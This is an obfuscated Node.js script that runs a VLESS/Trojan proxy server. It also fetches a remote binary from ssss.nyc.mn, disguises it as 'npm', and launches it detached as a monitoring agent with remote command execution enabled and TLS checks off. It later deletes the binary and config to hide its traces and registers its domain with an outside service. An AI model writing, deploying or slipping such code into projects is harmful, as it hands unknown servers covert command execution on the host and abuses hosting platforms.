const _0x427229=_0x1e8a;(function(_0x38b5c2,_0x1eb0a8){const _0x40b0d2=_0x1e8a,_0x11219b=_0x38b5c2();while(!![]){try{const _0x11d0b6=-parseInt(_0x40b0d2(0x192))/0x1*(parseInt(_0x40b0d2(0x1ad))/0x2)+-parseInt(_0x40b0d2(0x1e5))/0x3+parseInt(_0x40b0d2(0x195))/0x4*(-parseInt(_0x40b0d2(0x1e0))/0x5)+parseInt(_0x40b0d2(0x187))/0x6*(parseInt(_0x40b0d2(0x1a5))/0x7)+-parseInt(_0x40b0d2(0x1e3))/0x8*(parseInt(_0x40b0d2(0x198))/0x9)+-parseInt(_0x40b0d2(0x1b2))/0xa+parseInt(_0x40b0d2(0x1bd))/0xb*(parseInt(_0x40b0d2(0x1c8))/0xc);if(_0x11d0b6===_0x1eb0a8)break;else _0x11219b['push'](_0x11219b['shift']());}catch(_0x59a251){_0x11219b['push'](_0x11219b['shift']());}}}(_0x34e8,0xcac73));function _0x1e8a(_0x1bedcd,_0x211510){_0x1bedcd=_0x1bedcd-0x169;const _0x34e840=_0x34e8();let _0x1e8a25=_0x34e840[_0x1bedcd];return _0x1e8a25;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x427229(0x16c)),net=require(_0x427229(0x1c4)),path=require(_0x427229(0x1a7)),crypto=require(_0x427229(0x1aa)),{Buffer}=require(_0x427229(0x17b)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x427229(0x1e1)][_0x427229(0x1b4)]||_0x427229(0x169),NEZHA_SERVER=process[_0x427229(0x1e1)][_0x427229(0x174)]||'',NEZHA_PORT=process['env'][_0x427229(0x194)]||'',NEZHA_KEY=process[_0x427229(0x1e1)][_0x427229(0x17c)]||'',DOMAIN=process[_0x427229(0x1e1)][_0x427229(0x19c)]||_0x427229(0x172),AUTO_ACCESS=process['env'][_0x427229(0x181)]||![],WSPATH=process[_0x427229(0x1e1)]['WSPATH']||UUID[_0x427229(0x1a8)](0x0,0x8),SUB_PATH=process[_0x427229(0x1e1)][_0x427229(0x18b)]||_0x427229(0x18c),NAME=process[_0x427229(0x1e1)][_0x427229(0x188)]||'Hug',PORT=process[_0x427229(0x1e1)][_0x427229(0x1d1)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4001c5=_0x427229;try{const _0x36d0f2=await axios[_0x4001c5(0x1c1)](_0x4001c5(0x1c3)),_0x2d48a0=_0x36d0f2[_0x4001c5(0x1c7)];ISP=(_0x2d48a0[_0x4001c5(0x17a)]+'-'+_0x2d48a0[_0x4001c5(0x16a)])[_0x4001c5(0x16d)](/ /g,'_');}catch(_0x1e2bb8){ISP=_0x4001c5(0x1df);}};GetISP();const httpServer=http[_0x427229(0x1de)]((_0x582585,_0xaea3db)=>{const _0x2a7456=_0x427229;if(_0x582585[_0x2a7456(0x1e8)]==='/'){const _0x282be4=path[_0x2a7456(0x185)](__dirname,_0x2a7456(0x18f));fs[_0x2a7456(0x19a)](_0x282be4,_0x2a7456(0x1e9),(_0xedd0d,_0x1f5468)=>{const _0x5b1061=_0x2a7456;if(_0xedd0d){_0xaea3db['writeHead'](0xc8,{'Content-Type':_0x5b1061(0x18e)}),_0xaea3db[_0x5b1061(0x182)]('Hello\x20world!');return;}_0xaea3db['writeHead'](0xc8,{'Content-Type':_0x5b1061(0x18e)}),_0xaea3db[_0x5b1061(0x182)](_0x1f5468);});return;}else{if(_0x582585[_0x2a7456(0x1e8)]==='/'+SUB_PATH){const _0x4f8172=NAME?NAME+'-'+ISP:ISP,_0x21e952=_0x2a7456(0x1ba)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2a7456(0x178)+WSPATH+'#'+_0x4f8172,_0x2764ea='trojan://'+UUID+'@'+DOMAIN+_0x2a7456(0x199)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2a7456(0x178)+WSPATH+'#'+_0x4f8172,_0x4ffb20=_0x21e952+'\x0a'+_0x2764ea,_0x429052=Buffer[_0x2a7456(0x17f)](_0x4ffb20)[_0x2a7456(0x1b5)](_0x2a7456(0x189));_0xaea3db[_0x2a7456(0x190)](0xc8,{'Content-Type':_0x2a7456(0x1d6)}),_0xaea3db[_0x2a7456(0x182)](_0x429052+'\x0a');}else _0xaea3db[_0x2a7456(0x190)](0x194,{'Content-Type':_0x2a7456(0x1d6)}),_0xaea3db[_0x2a7456(0x182)](_0x2a7456(0x1b0));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x427229(0x18d),_0x427229(0x170)];function resolveHost(_0xc12aa9){return new Promise((_0xcfac3b,_0x36fa1d)=>{const _0x215bd4=_0x1e8a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x215bd4(0x1ca)](_0xc12aa9)){_0xcfac3b(_0xc12aa9);return;}let _0x40b6ad=0x0;function _0x3b137e(){const _0x55e985=_0x215bd4;if(_0x40b6ad>=DNS_SERVERS[_0x55e985(0x184)]){_0x36fa1d(new Error(_0x55e985(0x197)+_0xc12aa9+_0x55e985(0x1a2)));return;}const _0x557de2=DNS_SERVERS[_0x40b6ad];_0x40b6ad++;const _0x5bc3ac=_0x55e985(0x19f)+encodeURIComponent(_0xc12aa9)+'&type=A';axios[_0x55e985(0x1c1)](_0x5bc3ac,{'timeout':0x1388,'headers':{'Accept':_0x55e985(0x1da)}})[_0x55e985(0x1b1)](_0x456ab9=>{const _0x527d86=_0x55e985,_0x2ff876=_0x456ab9[_0x527d86(0x1c7)];if(_0x2ff876[_0x527d86(0x1be)]===0x0&&_0x2ff876['Answer']&&_0x2ff876[_0x527d86(0x19e)][_0x527d86(0x184)]>0x0){const _0x441be4=_0x2ff876['Answer'][_0x527d86(0x1a3)](_0x1675a6=>_0x1675a6[_0x527d86(0x1c0)]===0x1);if(_0x441be4){_0xcfac3b(_0x441be4[_0x527d86(0x1c7)]);return;}}_0x3b137e();})[_0x55e985(0x16b)](_0xc5ab65=>{_0x3b137e();});}_0x3b137e();});}function handleVlessConnection(_0x3434f4,_0x1b4c21){const _0x5c08cc=_0x427229,[_0x3f5f51]=_0x1b4c21,_0xd7a4a2=_0x1b4c21['slice'](0x1,0x11);if(!_0xd7a4a2[_0x5c08cc(0x16f)]((_0x597803,_0x526e62)=>_0x597803==parseInt(uuid['substr'](_0x526e62*0x2,0x2),0x10)))return![];let _0xd73aeb=_0x1b4c21['slice'](0x11,0x12)[_0x5c08cc(0x1cc)]()+0x13;const _0x1c4656=_0x1b4c21[_0x5c08cc(0x1a8)](_0xd73aeb,_0xd73aeb+=0x2)[_0x5c08cc(0x19b)](0x0),_0x4a6860=_0x1b4c21[_0x5c08cc(0x1a8)](_0xd73aeb,_0xd73aeb+=0x1)[_0x5c08cc(0x1cc)](),_0x1573c0=_0x4a6860==0x1?_0x1b4c21[_0x5c08cc(0x1a8)](_0xd73aeb,_0xd73aeb+=0x4)['join']('.'):_0x4a6860==0x2?new TextDecoder()[_0x5c08cc(0x1a0)](_0x1b4c21[_0x5c08cc(0x1a8)](_0xd73aeb+0x1,_0xd73aeb+=0x1+_0x1b4c21['slice'](_0xd73aeb,_0xd73aeb+0x1)['readUInt8']())):_0x4a6860==0x3?_0x1b4c21[_0x5c08cc(0x1a8)](_0xd73aeb,_0xd73aeb+=0x10)['reduce']((_0x17a94e,_0x497f2e,_0x350574,_0x2ec1b5)=>_0x350574%0x2?_0x17a94e[_0x5c08cc(0x1cb)](_0x2ec1b5[_0x5c08cc(0x1a8)](_0x350574-0x1,_0x350574+0x1)):_0x17a94e,[])['map'](_0x14d785=>_0x14d785[_0x5c08cc(0x19b)](0x0)[_0x5c08cc(0x1b5)](0x10))[_0x5c08cc(0x185)](':'):'';_0x3434f4['send'](new Uint8Array([_0x3f5f51,0x0]));const _0x4ba7d7=createWebSocketStream(_0x3434f4);return resolveHost(_0x1573c0)['then'](_0x3bdcc9=>{const _0x568413=_0x5c08cc;net[_0x568413(0x1c2)]({'host':_0x3bdcc9,'port':_0x1c4656},function(){const _0x47f595=_0x568413;this[_0x47f595(0x1b7)](_0x1b4c21['slice'](_0xd73aeb)),_0x4ba7d7['on'](_0x47f595(0x1b9),()=>{})['pipe'](this)['on'](_0x47f595(0x1b9),()=>{})['pipe'](_0x4ba7d7);})['on'](_0x568413(0x1b9),()=>{});})[_0x5c08cc(0x16b)](_0x2d5da4=>{const _0x2a2e33=_0x5c08cc;net['connect']({'host':_0x1573c0,'port':_0x1c4656},function(){const _0x237e50=_0x1e8a;this[_0x237e50(0x1b7)](_0x1b4c21['slice'](_0xd73aeb)),_0x4ba7d7['on'](_0x237e50(0x1b9),()=>{})[_0x237e50(0x1d2)](this)['on'](_0x237e50(0x1b9),()=>{})['pipe'](_0x4ba7d7);})['on'](_0x2a2e33(0x1b9),()=>{});}),!![];}function handleTrojanConnection(_0x61a136,_0x500892){const _0x14cb34=_0x427229;try{if(_0x500892[_0x14cb34(0x184)]<0x3a)return![];const _0x588fc8=_0x500892[_0x14cb34(0x1a8)](0x0,0x38)[_0x14cb34(0x1b5)](),_0x119e52=[UUID];let _0x49e9a5=null;for(const _0x177d79 of _0x119e52){const _0x300a7b=crypto[_0x14cb34(0x1c9)](_0x14cb34(0x1bb))[_0x14cb34(0x1ac)](_0x177d79)[_0x14cb34(0x179)](_0x14cb34(0x1e4));if(_0x300a7b===_0x588fc8){_0x49e9a5=_0x177d79;break;}}if(!_0x49e9a5)return![];let _0x3e0e35=0x38;_0x500892[_0x3e0e35]===0xd&&_0x500892[_0x3e0e35+0x1]===0xa&&(_0x3e0e35+=0x2);const _0x12100d=_0x500892[_0x3e0e35];if(_0x12100d!==0x1)return![];_0x3e0e35+=0x1;const _0x4b9634=_0x500892[_0x3e0e35];_0x3e0e35+=0x1;let _0x7c6fd4,_0x42da99;if(_0x4b9634===0x1)_0x7c6fd4=_0x500892['slice'](_0x3e0e35,_0x3e0e35+0x4)[_0x14cb34(0x185)]('.'),_0x3e0e35+=0x4;else{if(_0x4b9634===0x3){const _0x1af0c1=_0x500892[_0x3e0e35];_0x3e0e35+=0x1,_0x7c6fd4=_0x500892[_0x14cb34(0x1a8)](_0x3e0e35,_0x3e0e35+_0x1af0c1)[_0x14cb34(0x1b5)](),_0x3e0e35+=_0x1af0c1;}else{if(_0x4b9634===0x4)_0x7c6fd4=_0x500892['slice'](_0x3e0e35,_0x3e0e35+0x10)['reduce']((_0x33aa40,_0x4976be,_0x2d14b0,_0x1f6a04)=>_0x2d14b0%0x2?_0x33aa40['concat'](_0x1f6a04[_0x14cb34(0x1a8)](_0x2d14b0-0x1,_0x2d14b0+0x1)):_0x33aa40,[])[_0x14cb34(0x175)](_0x407217=>_0x407217[_0x14cb34(0x19b)](0x0)['toString'](0x10))['join'](':'),_0x3e0e35+=0x10;else return![];}}_0x42da99=_0x500892[_0x14cb34(0x19b)](_0x3e0e35),_0x3e0e35+=0x2;_0x3e0e35<_0x500892[_0x14cb34(0x184)]&&_0x500892[_0x3e0e35]===0xd&&_0x500892[_0x3e0e35+0x1]===0xa&&(_0x3e0e35+=0x2);const _0x20dd3a=createWebSocketStream(_0x61a136);return resolveHost(_0x7c6fd4)[_0x14cb34(0x1b1)](_0x61c81b=>{const _0x1e57be=_0x14cb34;net[_0x1e57be(0x1c2)]({'host':_0x61c81b,'port':_0x42da99},function(){const _0x36120b=_0x1e57be;_0x3e0e35<_0x500892[_0x36120b(0x184)]&&this['write'](_0x500892[_0x36120b(0x1a8)](_0x3e0e35)),_0x20dd3a['on'](_0x36120b(0x1b9),()=>{})[_0x36120b(0x1d2)](this)['on'](_0x36120b(0x1b9),()=>{})['pipe'](_0x20dd3a);})['on'](_0x1e57be(0x1b9),()=>{});})[_0x14cb34(0x16b)](_0x44c50a=>{const _0x24bbd1=_0x14cb34;net[_0x24bbd1(0x1c2)]({'host':_0x7c6fd4,'port':_0x42da99},function(){const _0x5bfe64=_0x24bbd1;_0x3e0e35<_0x500892[_0x5bfe64(0x184)]&&this[_0x5bfe64(0x1b7)](_0x500892[_0x5bfe64(0x1a8)](_0x3e0e35)),_0x20dd3a['on'](_0x5bfe64(0x1b9),()=>{})['pipe'](this)['on'](_0x5bfe64(0x1b9),()=>{})[_0x5bfe64(0x1d2)](_0x20dd3a);})['on']('error',()=>{});}),!![];}catch(_0x41d5a5){return![];}}wss['on'](_0x427229(0x1ab),(_0x171ae4,_0x28ef7f)=>{const _0x53a124=_0x427229,_0x37a44c=_0x28ef7f['url']||'';_0x171ae4[_0x53a124(0x16e)](_0x53a124(0x1a4),_0xd9fb64=>{const _0x5bc289=_0x53a124;if(_0xd9fb64[_0x5bc289(0x184)]>0x11&&_0xd9fb64[0x0]===0x0){const _0x5f451e=_0xd9fb64[_0x5bc289(0x1a8)](0x1,0x11),_0x2b7ecc=_0x5f451e[_0x5bc289(0x16f)]((_0x3d21ec,_0x1c900f)=>_0x3d21ec==parseInt(uuid[_0x5bc289(0x1d8)](_0x1c900f*0x2,0x2),0x10));if(_0x2b7ecc){!handleVlessConnection(_0x171ae4,_0xd9fb64)&&_0x171ae4['close']();return;}}!handleTrojanConnection(_0x171ae4,_0xd9fb64)&&_0x171ae4['close']();})['on'](_0x53a124(0x1b9),()=>{});});const getDownloadUrl=()=>{const _0x4f2fec=_0x427229,_0x53b606=os['arch']();return _0x53b606===_0x4f2fec(0x193)||_0x53b606===_0x4f2fec(0x1d5)||_0x53b606===_0x4f2fec(0x17e)?!NEZHA_PORT?_0x4f2fec(0x176):_0x4f2fec(0x196):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4f2fec(0x180);},downloadFile=async()=>{const _0x58652e=_0x427229;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x46ab42=getDownloadUrl(),_0x1c6855=await axios({'method':_0x58652e(0x1c1),'url':_0x46ab42,'responseType':_0x58652e(0x1bf)}),_0x1423aa=fs['createWriteStream']('npm');return _0x1c6855[_0x58652e(0x1c7)][_0x58652e(0x1d2)](_0x1423aa),new Promise((_0x53cf94,_0xf10313)=>{const _0x38f490=_0x58652e;_0x1423aa['on'](_0x38f490(0x1ae),()=>{const _0x4478d4=_0x38f490;console[_0x4478d4(0x1dc)](_0x4478d4(0x1d0)),exec(_0x4478d4(0x1d9),_0x55c679=>{if(_0x55c679)_0xf10313(_0x55c679);_0x53cf94();});}),_0x1423aa['on'](_0x38f490(0x1b9),_0xf10313);});}catch(_0x2e34b9){throw _0x2e34b9;}},runnz=async()=>{const _0x3e068d=_0x427229;try{const _0x117f8e=execSync(_0x3e068d(0x1ce),{'encoding':_0x3e068d(0x1b3)});if(_0x117f8e['trim']()!==''){console[_0x3e068d(0x1dc)](_0x3e068d(0x1e6));return;}}catch(_0x311e5a){}await downloadFile();let _0x306a86='',_0x483585=[_0x3e068d(0x1af),'8443',_0x3e068d(0x1d4),'2087','2083',_0x3e068d(0x1e7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a5519=_0x483585[_0x3e068d(0x177)](NEZHA_PORT)?'--tls':'';_0x306a86='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2a5519+_0x3e068d(0x17d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x45d51a=NEZHA_SERVER[_0x3e068d(0x177)](':')?NEZHA_SERVER[_0x3e068d(0x1c6)](':')['pop']():'',_0x476394=_0x483585[_0x3e068d(0x177)](_0x45d51a)?_0x3e068d(0x1c5):_0x3e068d(0x1dd),_0x234dcb=_0x3e068d(0x1a1)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3e068d(0x1d7)+_0x476394+_0x3e068d(0x19d)+UUID;fs[_0x3e068d(0x1b6)](_0x3e068d(0x1a6),_0x234dcb);}_0x306a86=_0x3e068d(0x1db);}else{console['log'](_0x3e068d(0x1cd));return;}}try{exec(_0x306a86,{'shell':_0x3e068d(0x1a9)},_0x6e7129=>{const _0x53c426=_0x3e068d;if(_0x6e7129)console[_0x53c426(0x1b9)](_0x53c426(0x173),_0x6e7129);else console['log'](_0x53c426(0x183));});}catch(_0x4c9561){console[_0x3e068d(0x1b9)](_0x3e068d(0x1bc)+_0x4c9561);}};async function addAccessTask(){const _0x4de939=_0x427229;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4f6515=_0x4de939(0x1d3)+DOMAIN;try{const _0x1a2400=await axios['post'](_0x4de939(0x1cf),{'url':_0x4f6515},{'headers':{'Content-Type':_0x4de939(0x1b8)}});console[_0x4de939(0x1dc)](_0x4de939(0x1e2));}catch(_0x5d2ab6){}}const delFiles=()=>{const _0x1a442f=_0x427229;fs['unlink'](_0x1a442f(0x186),()=>{}),fs[_0x1a442f(0x171)](_0x1a442f(0x1a6),()=>{});};function _0x34e8(){const _0x28cca8=['config.yaml','path','slice','/bin/bash','crypto','connection','update','8594GwKQwd','finish','443','Not\x20Found\x0a','then','13265570sKmJzC','utf-8','UUID','toString','writeFileSync','write','application/json','error','vless://','sha224','error:\x20','6870853lLucIz','Status','stream','type','get','connect','https://api.ip.sb/geoip','net','true','split','data','72iFfioy','createHash','test','concat','readUInt8','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','PORT','pipe','https://','2096','arm64','text/plain','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','substr','chmod\x20+x\x20npm','application/dns-json','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','log','false','createServer','Unknown','2163185fRfOYX','env','Automatic\x20Access\x20Task\x20added\x20successfully','32816MMirVv','hex','895959TquuVI','npm\x20is\x20already\x20running,\x20skip\x20running...','2053','url','utf8','31a5eee7-1f13-4b9d-834a-dda9b68a27b6','isp','catch','axios','replace','once','every','1.1.1.1','unlink','1234.abc.com','npm\x20running\x20error:','NEZHA_SERVER','map','https://arm64.ssss.nyc.mn/v1','includes','&path=%2F','digest','country_code','buffer','NEZHA_KEY','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','aarch64','from','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','end','npm\x20is\x20running','length','join','npm','12ZLBXRP','NAME','base64','listen','SUB_PATH','sub','8.8.4.4','text/html','index.html','writeHead','Server\x20is\x20running\x20on\x20port\x20','118lJbeLa','arm','NEZHA_PORT','12nUIMwC','https://arm64.ssss.nyc.mn/agent','Failed\x20to\x20resolve\x20','18WDaNAv',':443?security=tls&sni=','readFile','readUInt16BE','DOMAIN','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Answer','https://dns.google/resolve?name=','decode','client_secret:\x20','\x20with\x20all\x20DNS\x20servers','find','message','1824242FIQmSu'];_0x34e8=function(){return _0x28cca8;};return _0x34e8();}httpServer[_0x427229(0x18a)](PORT,()=>{const _0x5c9855=_0x427229;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5c9855(0x1dc)](_0x5c9855(0x191)+PORT);});
